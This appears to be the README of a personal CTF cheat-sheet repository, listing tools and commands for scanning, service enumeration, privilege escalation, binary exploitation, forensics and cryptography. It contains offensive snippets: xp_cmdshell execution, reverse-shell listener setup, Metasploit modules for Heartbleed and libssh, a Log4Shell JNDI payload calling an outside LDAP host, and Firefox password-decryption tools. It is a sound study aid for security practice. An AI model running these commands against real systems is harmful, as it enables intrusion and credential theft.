

<p align="center">
  <img src="Introduction/_img/datura.jpg" />
</p>

DaturaCTF is a database for **ideas** and **tools** to use in CTF competitions. It's purpose is to help the user (usually me) to find solutions and provide some tools to use when offline.

The tools that I use most often are marked with a heart <span style="color:red">❤️</span> symbol.

This database was mostly made from [CTF Katana](https://github.com/JohnHammond/ctf-katana) and [HackTricks](https://book.hacktricks.xyz), but also from tools found along the way. I do not own most of this content, I just gathered it in one place. Credit goes to the original authors, linked in the different sections.

Most of the tools are written in Python and are designed to be used in a Linux environment.

This file is auto generated using [build.py](build.py). To update it, update the README.md files in the subdirectories and run the build.py script.

# Table of Contents
* [Scanning](#scanning)
* [Services and Ports](#services-and-ports)
* [Reverse Shell](#reverse-shell)
* [Privilege Escalation](#privilege-escalation)
* [Binary Exploitation](#binary-exploitation)
* [Classic Exploits](#classic-exploits)
* [Reverse Engineering](#reverse-engineering)
* [Forensics](#forensics)
* [Cryptography](#cryptography)
* [Steganography](#steganography)
* [PDF Files](#pdf-files)
* [ZIP Files](#zip-files)
* [Hashes](#hashes)
* [OSINT](#osint)
* [Network](#network)
* [Jail Break](#jail-break)
* [Android](#android)
* [Web](#web)
* [Esoteric Languages](#esoteric-languages)
* [Data Science](#data-science)
* [Signal processing](#signal-processing)
* [Wireless](#wireless)
* [Other CheatSheets](#other-cheatsheets)

<br><br>

# Scanning

⇨ [File Scanning](#file-scanning)<br>⇨ [Network Scanning](#network-scanning)<br>⇨ [Website Scanning](#website-scanning)<br>





## File Scanning



* `file`

    Deduce the file type from the headers.

* `binwalk`

    Look for embedded files in other files.

    
    ```bash
    binwalk <file>            # List embedded files
    binwalk -e <file>         # Extract embedded files
    binwalk --dd=".*" <file>  # Extract all embedded files
    ```
    Alternatives: `foremost`, `hachoir-subfile`...

* `strings`

    Extract strings from a file.

* `grep`

    Search for a string, or regex, in a file.

	```bash
	grep <string> <file>          # Search in a file
	grep -r <string> <directory>  # Search recursively in a directory
	```

* `hexdump`

	Display the hexadecimal representation of a file.

	```bash
	hexdump -C <file>  # Dump bytes with adress and ascii representation
	hexdump <file>     # Dump bytes with adress only
	xxd -p <file>      # Dump only bytes
	```


* [`yara`](https://virustotal.github.io/yara/)

    Scan a file with Yara rules to find (malicious) patterns. ules can be found in the [Yara-Rules](https://github.com/Yara-Rules/rules)

* [`file signatures`](https://en.wikipedia.org/wiki/List_of_file_signatures)

    File signatures are bytes at the beginning of a file that identify the file type. This header is also called magic numbers.

    Most files can be [found here](https://en.wikipedia.org/wiki/List_of_file_signatures), but the most common ones are :

    | Hex signature | File type | Description |
    | --- | --- | --- |
    | `FF D8 FF` (???) | JPEG | [JPEG](https://en.wikipedia.org/wiki/JPEG) image |
    | `89 50 4E 47 0D 0A 1A 0A` (?PNG) | PNG | [PNG](https://en.wikipedia.org/wiki/Portable_Network_Graphics) image |
    | `50 4B` (PK) | ZIP | [ZIP](https://en.wikipedia.org/wiki/Zip_(file_format)) archive |



## Network Scanning



* [Private IPs]()

    Some ip ranges are reserved for private networks. They are not routable on the internet. They are:

    | Network | Range | Count |
    | --- | --- | --- |
    | `10.0.0.0/8` | `10.0.0.0` – `10.255.255.255` | 16,777,214 |
    | `172.16.0.0/16` | `172.16.0.0` - `172.31.255.255` | 1,048,574 |
    | `192.168.0.0/16` | `192.168.0.0` - `192.168.255.255` | 65,534 |




* [`nmap`](https://nmap.org/)

    `nmap` is a utility for network discovery.

	```bash
	nmap -sC -sV -O 192.168.0.0/24 # Classic scan
	nmap -sS 192.168.0.0/24        # SYN scan (faster but no service detection)
	```


* [Nmap scripts](https://nmap.org/nsedoc/scripts/)
  
	`nmap` has a lot of scripts that can be used to scan for specific vulnerabilities. They are called with the `--script` option.

	```bash
	nmap -sV --script dns-* <ip> # Run all dns scripts
	```

* [`traceroute`](https://en.wikipedia.org/wiki/Traceroute)

    See the machines that a packet goes through to reach its destination.



## Website Scanning




See [Web Enumeration](#web)



<br><br>

# Services and Ports



Assigned port numbers by IANA can be found at [IANA Port Numbers](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml). But other services can also run on these ports.




FTP - File Transfer Protocol - 21/tcp
-------------------------------------

Transfer files between a client and server.
The anonymous credentials are anonymous:anonymous.

```bash
ftp <ip> <port>  # Connect to a server
nmap -v -p 21 --script=ftp-anon.nse <ip> # Enumerate anonymous logins
```


SSH - Secure Shell - 22/tcp
---------------------------

Securely connect to a remote server.

```bash
# Connections
ssh <user>@<ip> -p <port> # Connect to a server
ssh -L <local_port>:<remote_host>:<remote_port> <user>@<ip> # Port forwarding

# Transfer files
scp <file> <user>@<ip>:<path>   # Local to remote
scp <user>@<ip>:<path> <file>   # Remote to local
scp -r <dir> <user>@<ip>:<path> # whole directory
```

DNS - Domain Name System - 53/udp
---------------------------------

DNS is used to resolve domain names to IP addresses. `BIND` is the most common DNS implementation.

* [`nslookup`](https://en.wikipedia.org/wiki/Nslookup)

	Query a DNS server for information about a domain name.

* [`dig`](https://en.wikipedia.org/wiki/Dig_(command))

	Query a DNS server for information about a domain name.

* [Zone transfer attack](https://en.wikipedia.org/wiki/DNS_zone_transfer)

	Zone transfer is a method of transferring a copy of a DNS zone from a DNS server to another DNS server. This can be used to enumerate DNS records of a hidden zone if we know one of it's domain.

	To perform a zone transfer, use `dig` with the `axfr` option.
	```bash
	dig axfr @<dns-server> <domain>
	```

HTTP(S) - Hypertext Transfer Protocol - 80/tcp 443/tcp
------------------------------------------------------


See [Web](#web) for more information.


POP3 - Post Office Protocol - 110/all
-------------------------------------

POP3 is used to retrieve emails from a server.


SMB - Samba - 445/all
---------------------

Samba is a free and open-source implementation of the SMB/CIFS network protocol. It allows file and printer sharing between Linux and Windows machines.

A smb server can have multiple **shares** (~partition) with their own permissions. They can be listed with `smbmap` or `enum4linux` and accessed with `smbclient`.

* [`smbmap`](https://github.com/ShawnDEvans/smbmap)

	Emumerate SMB shares and their permissions.

	```bash
	smbmap -H <ip> -u anonymous                       # List shares as anonymous user
	smbmap -H 10.10.10.125 -u <user> -p <password>    # Logged in as a user
	smbmap -H 10.10.10.125 -u <user> -p <password> -r # List everything recursively

	# When NO_LOGON_SERVERS is returned, try with the localhost domain
	smbmap -H 10.10.10.125 -u <user> -d localhost # With domain specified
	```

* `enum4linux` <span style="color:red">❤️</span>

	Enumerate SMB shares and their permissions.

	```bash
	enum4linux 10.10.10.125
	```

* `smbclient`

	Access SMB shares. You can use the `-m SMB2` option to force SMB2 protocol on weird servers.

Connect a share and enter the smb CLI:
```
smbclient \\\\10.10.139.198\\admins -U "ubuntu%S@nta2022"
```
Here you can use regular linux commands to navigate and `get`, `put` to transfer data.

LDAP - Lightweight Directory Access Protocol 389/all ldaps 636/all
-----------------------------------------------------------------

LDAP is used to store information about **users**, computers, and other resources. It is used by Active Directory.

A ldap DN (distinguished name) is a string that identifies a resource in the LDAP directory. It is composed of a series of RDNs (Relative Distinguished Names) separated by commas. Each RDN is composed of an attribute name and a value. For example, the DN `CN=John Doe,OU=Users,DC=example,DC=com` identifies the user `John Doe` in the `Users` organizational unit of the `example.com` domain.

The different attribute names are :

| Attribute | Description |
|-----------|-------------|
| `CN` | Common name |
| `L` | Locality name |
| `ST` | State or province name |
| `O` | Organization name |
| `OU` | Organizational unit name |
| `C` | Country name |
| `STREET` | Street address |
| `DC` | Domain component |
| `UID` | User ID |


* [`ldapsearch`](https://linux.die.net/man/1/ldapsearch)

	`ldapsearch` is a command line tool for querying LDAP servers.

	Anonymously query a LDAP server for information about a domain name.
	```bash
	ldapsearch -H ldap://<ip>:<port> -x -s base '' "(objectClass=*)" "*" + # Without DN
	ldapsearch -H ldap://<ip>:<port> -x -b <DN> # With DN
	```


SQL - Structured Query Language
-------------------------------

| Port | Service | Description |
|------|---------|-------------|
| 1433 | MSSQL | Microsoft SQL Server |
| 3306 | MySQL | MySQL Database |
| 5432 | PostgreSQL | PostgreSQL Database |



MSSQL - Microsoft SQL Server - 1433/tcp
---------------------------------------

* `impacket` -> `mssqlclient.py`

	You can connect to a Microsoft SQL Server with `myssqlclient.py` knowing a username and password like so:

```
mssqlclient.py username@10.10.10.125
```

It will prompt you for a password. **If your password fails, the server might be using "Windows authentication", which you can use with:**

```
mssqlclient.py username@10.10.10.125 -windows-auth
```

If you have access to a Micosoft SQL Server, you can try and `enable_xp_cmdshell` to run commands. With `mssqlclient.py` you can try:

```
SQL> enable_xp_cmdshell
```

though, you may not have permission. If that DOES succeed, you can now run commands like:

```
SQL> xp_cmdshell whoami
```

SNMP - Simple Network Management Protocol 161/udp 162/udp
---------------------------------------------------------

* snmp-check

```
snmp-check 10.10.10.125
```






<br><br>

# Reverse Shell





* [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

    Compilation of useful payloads and bypass for Web Application Security and Pentest/CTF.

* [`netcat`](https://en.wikipedia.org/wiki/Netcat)

    A utility for reading from and writing to network connections using TCP or UDP.

    Netcat classic listener
    ```bash
    $ nc -nlvp 4444
    ```

* [`rlwrap`](https://github.com/hanslub42/rlwrap)

    Allows you to use the arrow keys in a reverse shell.

    ```bash
    $ rlwrap nc -nlvp 4444
    ```

* Upgrade a shell to a TTY shell

    ```bash
    python -c 'import pty; pty.spawn("/bin/bash")'
    ```
<br><br>

# Privilege Escalation



* `sudo`

    First thing to check. See what the current user is allowed to do.
    ```bash
    sudo -l # List available commands
    ```


* [`PEAS`](https://github.com/carlospolop/PEASS-ng) <span style="color:red">❤️</span>

    Find common misconfigurations and vulnerabilities in Linux and Windows.

    Some payload can be found in the [Tools](Privilege%20Escalation/Tools/PEAS/) section.

    Send linpeas via ssh
    ```bash	
    scp linpeas.sh user@domain:/tmp
    ```


* setuid Files

    Files with the setuid bit set are executed with the permissions of the owner of the file, not the user who started the program. This can be used to escalate privileges.

    [GTFOBins](https://gtfobins.github.io/) has a list of setuid binaries that can be used to escalate privileges.

    Custom setuid files can be exploited using [binary exploitation](#binary-exploitation).


    Find files with the setuid bit set.
    ``` bash
    find / -perm -u=s -type f 2>/dev/null
    ```

* [CVE-2021-3156](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3156)

    sudo versions before **1.9.5p2** are vulnerable to a heap-based buffer overflow. This can be exploited to gain root access. Very useful on older systems.

    Some payload can be found in the [Tools](Privilege%20Escalation/Tools/CVE-2021-3156/) section.


<br><br>

# Binary Exploitation

⇨ [ELF](#elf)<br>⇨ [Windows](#windows)<br>

Different types of exploit exists, the most common are:

| Name | Description |
| ---- | ----------- |
| [Format String](/Tools/ELF/6-format_string_vulns/) | Exploits format string functions to read and write in the program memory |
| [Overwriting stack variables](/Tools/ELF/1-overwriting_stack_variables/) | Change the value of a variable on the stack. |
| [ret2win](/Tools/ELF/3-ret2win_with_params/) | Overwrite the return address to point to an interesting function of the program |
| [Shellcode](/Tools/ELF/4-injecting_custom_shellcode/) | Inject shellcode in the program memory and execute it |
| [ret2libc](/Tools/ELF/5-return_to_libc/) | Overwrite the return address to point to an intersting function in libc |
| [Overwriting GOT](/Tools/ELF/8-overwriting_got/) | Overwrite the address of a function in the GOT to point to an interesting function |

But some security mechanisms exists and can be bypassed:

- ASLR<br>
    Randomization of the memory addresses of the program and the libraries.
    Solution: Leak an adress and calculate the offset between the leaked address and the address of the function you want to call.

- NX<br>
    No execution of the stack.

- Stack canaries<br>
    A random value is stored on the stack and checked before returning from a function.
    Solution: [Leak the canary](/Tools/ELF/9-bypassing_canaries/) and overwrite it with the correct value.

- PIE<br>
    Randomization of the memory addresses of the program.
    Solution: [Leak an adress](/Tools/ELF/7-leak_pie_ret2libc/)

Tools that will help you to exploit a binary:

* [gdb](https://en.wikipedia.org/wiki/GNU_Debugger)

    Most popular debugger for **dynamic** analysis.
    See [Reverse Engineering](#reverse%20engineering) for more info.

* [Ghidra](https://ghidra-sre.org/)

	Decompiler for binary files, usefull for **static** analysis.
	See [Reverse Engineering](#reverse%20engineering) for more info.

* [---x--x--x root root]()

    To exfiltrate or read a binary when you only have **execution rights**, you can load it with a library and use the library to read it.

    This needs that the binary is **dynamically linked**, and is easier if you know the name of the function you want to extract.

    Code for this libary is provided [here](Binary%20Exploitation/Tools/exec_only_dumper).

    [CTF time WU](https://ctftime.org/writeup/7670)<br>
    [DGHack 2022 WU](https://remyoudompheng.github.io/ctf/dghack2022/wanna_more_features.html)

## ELF




* [`checksec`](https://docs.pwntools.com/en/stable/commandline.html)

    A command-line tool that will check the security mechanisms of a binary.
    
* [`pwntools`](https://docs.pwntools.com/en/stable/about.html)

    A python library that can be used to interact with a binary.

* [`ROPgadget`](https://pypi.org/project/ROPGadget/)

    A command-line tool that can be used to find gadgets in a binary.

* [`ropper`](https://github.com/sashs/Ropper)

    A command-line tool that can be used to find gadgets in a binary.



## Windows




* [`winchecksec`](https://github.com/trailofbits/winchecksec)

	Checks the security features of a Windows binary.

* [`wine`](https://www.winehq.org/) <span style="color:red">❤️</span>

	Runs Windows programs on Linux.

* [`winedbg`](https://www.winehq.org/)

	Debugger for Windows programs on Linux.

	Debug a Windows program on Linux with `winedbg` in gdb mode:
	```bash
	winedbg --gdb <program>
	```

* [`gdb server for wine`](https://www.gnu.org/software/gdb/)

	Remote debugger inside wine. The (very large) package is called `gdb-mingw-w64` on most Linux distributions.

	Start a gdb server inside wine: ([found here](https://stackoverflow.com/questions/39938253/how-to-properly-debug-a-cross-compiled-windows-code-on-linux))
	```bash
	wine Z:/usr/share/win64/gdbserver.exe localhost:12345 myprogram.exe
	x86_64-w64-mingw32-gdb myprogram.exe
	```

* [`Immunity Debugger`](https://www.immunityinc.com/products/debugger/)

	Debugger for Windows programs. I recommend using only GDB in order to learn less commands.

* [`pefile`](https://github.com/erocarrera/pefile)

	Get info about PE files.

* [dnSpy](https://github.com/0xd4d/dnSpy) 
	
	.NET debugger and assembly editor.

* [PEiD](https://www.aldeid.com/wiki/PEiD)

	Detects packers, cryptors, compilers, etc.

* jetBrains .NET decompiler

	exists

* [AutoIt](https://www.autoitscript.com/site/autoit/)

	Scripting language for Windows.


<br><br>

# Classic Exploits



* Heartbleed

	Metasploit module: `auxiliary/scanner/ssl/openssl_heartbleed`

	Be sure to use `set VERBOSE true` to see the retrieved results. This can often contain a flag or some valuable information.

* libssh - SSH

	`libssh0.8.1` (or others??) is vulnerable to an easy and immediate login. Metasploit module: `auxiliary/scanner/ssh/libssh_auth_bypass`. Be sure to `set spawn_pty true` to actually receive a shell! Then `sessions -i 1` to interact with the shell spawned (or whatever appropriate ID)

* Default credentials

    Unconfigured system can use the default credentials to login. Some can be found here: [DefaultCreds-Cheat-Sheet.csv](https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv)

* Log4Shell

	Exploit on the Java library **Log4j**. Malicious code is fetched and executed from a remote JNDI server. A payload looks like `${jndi:ldap://exemple.com:1389/a}` and need to be parsed by Log4j.

	[Simple POC](https://github.com/kozmer/log4j-shell-poc)
	
	[JNDI Exploit Kit](https://github.com/pimps/JNDI-Exploit-Kit)

	[ECW2022 author's WU](https://gist.github.com/Amossys-team/e99cc3b979b30c047e6855337fec872e#web---not-so-smart-api)

	[Request Bin](https://requestbin.net/) Usefull for detection and environment variable exfiltration.
<br><br>

# Reverse Engineering

⇨ [Virtualisation](#virtualisation)<br>⇨ [Python](#python)<br>


* [ltrace](http://man7.org/linux/man-pages/man1/ltrace.1.html) and [strace](https://strace.io)

	Repport library, system calls and signals.

* [gdb](https://en.wikipedia.org/wiki/GNU_Debugger) <span style="color:red">❤️</span>

	Most used debugger, can be impoved with [GEF](https://hugsy.github.io/gef/) or [PEDA](https://github.com/longld/peda).

	Install GEF on top of gdb:
	```bash
	bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
	```

* [Ghidra](https://ghidra-sre.org/) <span style="color:red">❤️</span>

	Decompiler for binary files, usefull for **static** analysis.

	Automaticaly create a ghidra project from a binary file using [this script](Reverse%20Engineering/Tools/ghidra.py):
	```bash
	ghidra.py <file>
	```

* [Hopper](https://www.hopperapp.com)

	Disassembler.

* [Binary Ninja](https://binary.ninja)

	Good for multithreaded analysis.


* [IDA](https://www.hex-rays.com/products/ida/support/download.shtml) <span style="color:red">❤️</span>

	Proprietary reverse engineering software, known to have the best disassembler. The free version can only disassemble 64-bit binaries.

* [radare2](https://github.com/radareorg/radare2)

	Binary analysis, disassembler, debugger. Identified as `r2`.


* Compiling & running ASM code:

	You can convert ASM functions from assembly and run them as C functions like the following:

	`asm4.S`
	```asm
	.intel_syntax noprefix
	.global asm4
	asm4:
		push   ebp
		mov    ebp,esp
		push   ebx
		sub    esp,0x10
		mov    DWORD PTR [ebp-0x10],0x27d
		mov    DWORD PTR [ebp-0xc],0x0
		jmp    label2
	label1:
		add    DWORD PTR [ebp-0xc],0x1
	label2:
		mov    edx,DWORD PTR [ebp-0xc]
		mov    eax,DWORD PTR [ebp+0x8]
		add    eax,edx
		movzx  eax,BYTE PTR [eax]
		test   al,al
		jne    label1
		mov    DWORD PTR [ebp-0x8],0x1
		jmp    label3
	label4:
		mov    edx,DWORD PTR [ebp-0x8]
		mov    eax,DWORD PTR [ebp+0x8]
		add    eax,edx
		movzx  eax,BYTE PTR [eax]
		movsx  edx,al
		mov    eax,DWORD PTR [ebp-0x8]
		lea    ecx,[eax-0x1]
		mov    eax,DWORD PTR [ebp+0x8]
		add    eax,ecx
		movzx  eax,BYTE PTR [eax]
		movsx  eax,al
		sub    edx,eax
		mov    eax,edx
		mov    edx,eax
		mov    eax,DWORD PTR [ebp-0x10]
		lea    ebx,[edx+eax*1]
		mov    eax,DWORD PTR [ebp-0x8]
		lea    edx,[eax+0x1]
		mov    eax,DWORD PTR [ebp+0x8]
		add    eax,edx
		movzx  eax,BYTE PTR [eax]
		movsx  edx,al
		mov    ecx,DWORD PTR [ebp-0x8]
		mov    eax,DWORD PTR [ebp+0x8]
		add    eax,ecx
		movzx  eax,BYTE PTR [eax]
		movsx  eax,al
		sub    edx,eax
		mov    eax,edx
		add    eax,ebx
		mov    DWORD PTR [ebp-0x10],eax
		add    DWORD PTR [ebp-0x8],0x1
	label3:
		mov    eax,DWORD PTR [ebp-0xc]
		sub    eax,0x1
		cmp    DWORD PTR [ebp-0x8],eax
		jl     label4
		mov    eax,DWORD PTR [ebp-0x10]
		add    esp,0x10
		pop    ebx
		pop    ebp
		ret
	```

	`asm4.c`
	```c
	#include<stdio.h>
	extern int asm4(char* s);

	int main(){
	    char *str = "picoCTF_d899a";
	    printf("%X", asm4(str));
	    return 0;
	}
	```
	`bash`
	```bash
	$ gcc -m32 -o a asm4.c asm4.S
	$ ./a
	```

* Punchcards

	[Punch card emulator](http://tyleregeto.com/article/punch-card-emulator)


* GameBoy ROMS

	Packages to run GameBoy ROMS: `visualboyadvance` or `retroarch`


## Virtualisation



In order to run some system, it is nessesary to use virtualisation.



## Python




* [`uncompyle6`](https://github.com/rocky/python-uncompyle6/)

	Decompiles Python bytecode to equivalent Python source code. Support python versions to to 3.8.

	Legend has it that it exists an option (maybe -d) that can suceed when the regular decompilation fails.

* [Decompyle++](https://github.com/zrax/pycdc)

	Less reliable, but claims to decompile every python versions.

* [Easy Python Decompiler](https://sourceforge.net/projects/easypythondecompiler/)

	Windows GUI to decompile python bytecode.

* [Pyinstaller Extractor](https://github.com/extremecoders-re/pyinstxtractor)

	Extracts the python bytecode from pyinstaller windows executables. Can be decomplied  after.

	```bash
	python3 pyinstxtractor.py <filename>
	```


<br><br>

# Forensics

⇨ [Disk Image](#disk-image)<br>⇨ [Browser Forensics](#browser-forensics)<br>⇨ [Logs](#logs)<br>⇨ [Images](#images)<br>⇨ [Memory Dump](#memory-dump)<br>⇨ [Docker](#docker)<br>


* `File scanning`

	Use [this section](#file%20scanning) to find information about files.


* Keepass

	`keepassx` can be installed on Ubuntu to open and explore Keepass databases. Keepass databases master passwords can be cracked with `keepass2john`.


* [`VS Code Hex editor`](https://marketplace.visualstudio.com/items?itemName=ms-vscode.hexeditor)

	An extension for VS Code that allows you to view and edit files in hexadecimal format.

## Disk Image



* [Autopsy](https://www.autopsy.com/download/) <span style="color:red">❤️</span>

    Browse the filesystem and extract files from a disk image. ALso recovers deleted files.

* [`mount`]

    Mount a disk image to a filesystem.
    
    I recommand to use a virtual machine to mount the disk image. This way you can browse the filesystem and extract files without risking to damage your system.

* [TestDisk](https://www.cgsecurity.org/Download_and_donate.php/testdisk-7.1-WIP.linux26.tar.bz2) 
	
    CLI tool to recover lost partitions and/or make non-booting disks bootable again.

* [photorec](https://www.cgsecurity.org/wiki/PhotoRec) 
	
    CLI tool to recover deleted files. Works with raw data, so the disk do not need to have a partition system working.






## Browser Forensics

⇨ [Firefox profiles](#firefox-profiles)<br>

The browser profile contains a lot of information about the user, such as bookmarks, history, cookies, stored passwords, etc.


* Profile location
    
    In Windows:
    | Browser | Location |
    | --- | --- |
    | Chrome | `C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default` |
    | [Firefox](https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data) | `C:\Users\<username>\AppData\Roaming\Mozilla\Firefox\Profiles\<profile>` |
    | Edge | `C:\Users\<username>\AppData\Local\Microsoft\Edge\User Data\Default` |

    In Linux:
    | Browser | Location |
    | --- | --- |
    | Chrome | `~/.config/google-chrome/Default` |
    | [Firefox](https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data) | `~/.mozilla/firefox/<profile>` |




### Firefox profiles



Firefox based browsers (and Thunderbird) store their profiles in the following files in the profile folder (usually `XXXXXXXX.default`):

| File | Description |
| --- | --- |
| `places.sqlite` | Bookmarks, history, cookies, etc... |
| `keyN.db` with N=3 or 4 | Master password, used to encrypt the stored passwords |
| `signons.sqlite` or `logins.json` | Stored passwords |
| `certN.db` with N=8 or 9 | Certificates |

* [Dumpzilla](https://github.com/Busindre/dumpzilla) <span style="color:red">❤️</span>

    Dumps everything from a Firefox profile. 

    ```bash
    python3 dumpzilla.py /path/to/your-profile/
    ```
    
    Uses [NSS](https://en.wikipedia.org/wiki/Network_Security_Services) to decrypt passwords, which can be hard to install.


* [Firefox decrypt](https://github.com/unode/firefox_decrypt)

    Decrypts passwords from Firefox. Better support than dumpzilla but dont handle legacy profiles (key3.db).

    ```bash
    python3 firefox_decrypt.py /path/to/your-profile/
    ```

    Uses [NSS](https://en.wikipedia.org/wiki/Network_Security_Services) to decrypt passwords, which can be hard to install. Similar to [nss-password](https://github.com/glondu/nss-passwords) which can be installed with a .deb file.

* [FirePWD](https://github.com/lclevy/firepwd)

    Decrypt all types of firefox passwords (including legacy).

    ```bash
    python3 firepwd.py -d /path/to/your-profile/
    ```

    Do not use [NSS](https://en.wikipedia.org/wiki/Network_Security_Services) to decrypt passwords, which makes it easier to install. Found this tool [here](https://security.stackexchange.com/questions/152285/command-line-tools-to-decrypt-my-firefox-45-7-0-passwords-using-key3-db-and-logi)





## Logs



Looking at logs takes time but can lead to valuable information.

* [Windows Event Logs](https://en.wikipedia.org/wiki/Event_Viewer)

    Windows logs a *lot* of information. It can be read using `mmc.exe`, under "Windows Logs".

    The categories are:
    | Category | Description |
    | --- | --- |
    | Application | Programs (started, stopped ...) |
    | Security | Security events (login, logout, ...) |
    | System | Changes to system (boot, shutdown, peripherals ...) |
    | Setup | System maintainance (update logs, ...) |

* [Linux logs](https://fr.wikipedia.org/wiki/Syslog)

    Linux logs are stored in `/var/log/`. The most important ones are:
    | File | Description |
    | --- | --- |
    | `auth.log` or `secure` | Authentication events (login, logout, ...) |
    | `syslog` or `messages` | General messages (system wide) |
    | `dpkg.log` | Package managment |
    | `kern.log` | Kernel messages |
    | `btmp` | Failed login attempts |
    | `wtmp` | Login/logout history |
    | `lastlog` | Last login for each user |

    `btmp`, `wtmp` and `lastlog` can be read using `last <file>`

    Other applications can have their own logs in /var/logs.

* [Apache logs](https://httpd.apache.org/docs/2.4/logs.html)
  
    Apache logs are often stored in `/var/log/apache2/`. The most important ones are:
    | File | Description |
    | --- | --- |
    | `access.log` | HTTP requests |
    | `error.log` | HTTP errors |
    | `other_vhosts_access.log` | HTTP requests from other virtual hosts |

    `access.log` can be read using `tail -f <file>` or with `grep` to filter the logs.

    It can also be imported into a [pandas dataframe](https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.read_csv.html) using this snippet:
    ```python
    # Read access.log file
    df = pd.read_csv(filename,
                sep=r'\s(?=(?:[^"]*"[^"]*")*[^"]*$)(?![^\[]*\])',
                engine='python',
                usecols=[0, 3, 4, 5, 6, 7, 8],
                names=['ip', 'datetime', 'request', 'status', 'size', 'referer', 'user_agent'],
                na_values='-',
                header=None
                    )

    # Extract the date from the datetime column
    df['date'] = df['datetime'].str.extract(r'\[(.*?):', expand=True)

    # Extract the time from the datetime column
    df['time'] = df['datetime'].str.extract(r':(.*?)\s', expand=True)
    ```




## Images




* `pngcheck`

	Check if a **PNG** file is valid. If it is not, displays the error.


* [`pngcsum`](http://www.schaik.com/png/pngcsum/pngcsum-v01.tar.gz)

	Correct the CRCs present in a **PNG** file.


* [https://github.com/sherlly/PCRT](https://github.com/sherlly/PCRT)

	Correct a corrupted PNG file.

	Utility to try and correct a **PNG** file. 
	Need to press enter to show the file.

* Repair image online tool

    Good low-hanging fruit to throw any image at: [https://online.officerecovery.com/pixrecovery/](https://online.officerecovery.com/pixrecovery/)



* [Analysis Image] ['https://29a.ch/photo-forensics/#forensic-magnifier']

	Forensically is free online tool to analysis image this tool has many features like  Magnifier, Clone Detection, Error Level analysis, Noise Analusis, level Sweep, Meta Data, Geo tags, Thumbnail Analysis , JPEG Analysis, Strings Extraction.




## Memory Dump



Memory dumps are captures of the state of the memory at a given time. It contains all the loaded files, processes and data that was used at this moment.

Memory dumps can be analyzed using the [Volatility Framework](https://www.volatilityfoundation.org/) <span style="color:red">❤️</span> .

I recommand using **volatility 3** so you do not have to bother with profiles (finding it was often a pain in vol2).

The documentation can be found [here](https://volatility3.readthedocs.io)

* [Online Cheat Sheet](https://blog.onfvp.com/post/volatility-cheatsheet/)

* [Windows Memory Forensics](https://volatility3.readthedocs.io/en/latest/getting-started-windows-tutorial.html#)

* [Linux Memory Forensics](https://volatility3.readthedocs.io/en/latest/getting-started-linux-tutorial.html)

* Most useful plugins

    | Plugin | Description |
    | --- | --- |
    | `pslist` | List all processes |
    | `filescan` | List all files |
    | `filedump` | Dump a file from memory |
    | `netscan` | List all network connections |

    Some usefull windows commands:
    ```bash
    # Utility
    export DUMP_NAME=memory.dmp
    mkdir out

    # General information
    sudo vol -f $DUMP_NAME windows.info # Get windows version
    sudo vol -f $DUMP_NAME windows.filescan > out/filescan.txt # List all files
    sudo vol -f $DUMP_NAME windows.pslist > out/pslist.txt # List all running processes
    sudo vol -f $DUMP_NAME windows.pstree > out/pstree.txt # List all running processes as a tree
    sudo vol -f $DUMP_NAME windows.netscan > out/netscan.txt # List all network connections
    sudo vol -f $DUMP_NAME windows.cmdlines > ./out/cmdlines.txt # List all commands executed and their arguments (arguments are usually very interesting)
    
    # Specific information
    sudo vol -f $DUMP_NAME windows.dumpfiles --physaddr <addr> # Dump a file from memory (addr from filescan)
    sudo vol -f $DUMP_NAME windows.handles --pid <pid> # List all handles of a process (files opened, etc...)
    
    # Registry
    sudo vol -f $DUMP_NAME windows.registry.hivescan > out/hivescan.txt # List all registry hives
    sudo vol -f $DUMP_NAME windows.registry.hivelist > out/hivelist.txt # List all registry hives
    sudo vol -f $DUMP_NAME windows.registry.printkey.PrintKey --key 'Software\Microsoft\Windows\CurrentVersion\Run' > out/autoruns.txt # List all autoruns
    ```





* Browser profile

    It is often a good idea to look at the browser profile to find interesting information, such as bookmarks, history, cookies, stored passwords, etc... 
    
    See [Browser Forensics](#browser%20forensics) for more information.







## Docker



* [Dive](https://github.com/wagoodman/dive)

    Explore layers of a docker image.

    If a interesting file modification is found, it can be extracted from the image with an archive editing software (or with `dive export <image> <layer> <file> <output>` ?).


<br><br>

# Cryptography

⇨ [AES](#aes)<br>⇨ [Simple Codes](#simple-codes)<br>⇨ [RSA](#rsa)<br>

* [SageMath](https://www.sagemath.org/)

    Powerful mathematics software, very useful for crypto and number theory.

## AES



[AES](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard) A.K.A. Rijndael is a **symmetric** cryptographic algorithm. It uses the **same key** for encryption and decryption.

* AES ECB

	The "blind SQL" of cryptography... leak the flag out by testing for characters just one byte away from the block length.



## Simple Codes



* [DCode](https://www.dcode.fr)

	Support many crypto algorithms, but also some interesting tools.

* [CyberChef](https://gchq.github.io/CyberChef/) <span style="color:red">❤️</span>

	Online tool to encrypt/decrypt, encode/decode, analyse, and perform many other operations on data.


* [Keyboard Shift](https://www.dcode.fr/keyboard-shift-cipher)

	ROT but using the keyboard layout.


* XOR

	Simple logic operation that can be used to encrypt a message with a key.

	Encryption: c = m ^ k
	Decryption: m = c ^ k

* [Caesar Cipher](https://www.dcode.fr/caesar-cipher)

	Shift cipher using the alphabet. Different alphabets can also be used. Vulnerable to **frequency analysis**.


* [Atbash Cipher](https://en.wikipedia.org/wiki/Atbash) 
	
	Shift cipher using the alphabet in reverse order. Vulnerable to frequency analysis.

* [Vigenere Cipher](https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher) 
	
	Shift cipher using a key. The key is repeated to match the length of the message.

	| Type    | Content     |
    |---------|-------------|
	| Message | HELLO WORLD |
	| Key     | ABCDE FABCD |
	| Cipher (sum)%26  | HFNLP XQEMK |



* [Gronsfeld Cipher](http://rumkin.com/tools/cipher/gronsfeld.php)

	Variant of the Vigenere cipher using a key of numbers instead of letters.

* [Beaufourt Cipher](https://www.dcode.fr/beaufort-cipher)


* [Bacon Cipher](https://en.wikipedia.org/wiki/Bacon%27s_cipher)

